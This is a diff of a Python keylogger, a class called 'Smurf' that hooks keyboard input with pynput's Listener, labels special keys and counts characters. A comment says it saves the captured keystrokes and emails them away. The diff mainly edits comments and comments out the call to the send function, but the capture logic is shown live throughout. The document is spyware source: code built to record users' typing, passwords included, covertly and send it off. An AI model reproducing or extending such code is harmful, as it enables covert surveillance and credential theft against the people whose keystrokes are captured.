@@ -27,7 +27,8 @@ class Smurf:
     def listen_to_me(self, keypress):
         self.char_count += 1
         string_key = str(keypress)
-
+        
+        # maybe we should use a dictionary instead of a long list of IFs - more manageable
         if string_key == 'Key.space':
             string_key = "' '"
         elif string_key == 'Key.enter':
@@ -52,9 +53,10 @@ class Smurf:
             string_key = "' [KEYLEFT] '"
         elif string_key == 'Key.right':
             string_key = "' [KEYRIGHT] '"
-        # for testing purposes
+        # for convenient testing purposes use exit()
         elif string_key == 'Key.esc':
             exit()
+            # string_key == "' [ESC] '"
         else:
             pass
 
@@ -77,4 +79,4 @@ if __name__ == "__main__":
     with Listener(on_press=smf.listen_to_me, on_release=smf.release_me) as agent:
             agent.join()
             # if the script is interrupted or before it ends, it will save and send an email
-            smf.send_away()
+            # smf.send_away()
